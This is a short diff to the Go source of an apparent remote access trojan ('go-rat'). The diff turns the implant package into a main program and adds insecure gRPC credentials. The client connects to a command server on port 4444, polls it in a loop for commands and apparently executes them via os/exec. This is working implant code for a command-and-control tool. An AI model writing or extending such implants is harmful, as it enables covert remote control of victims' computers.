@@ -1,13 +1,13 @@
-package implant
+package main
 
 import (
 	"context"
 	"github.com/iortego42/go-rat/grpcapi"
 	"google.golang.org/grpc"
+	"google.golang.org/grpc/credentials/insecure"
 	"log"
 	"os/exec"
 	"strings"
-	"time"
 )
 
 func main() {
@@ -17,6 +17,7 @@ func main() {
 		err    error
 		client grpcapi.ImplantClient
 	)
+	opts = append(opts, grpc.WithTransportCredentials(insecure.NewCredentials()))
 	conn, err = grpc.NewClient("127.0.0.1:4444", opts...)
 
 	if err != nil {
@@ -35,7 +36,7 @@ func main() {
 			log.Panic(err)
 		}
 		if cmd.In == "" {
-			time.Sleep(time.Second)
+			//time.Sleep(100)
 			continue
 		}
 		tokens := strings.Split(cmd.In, " ")
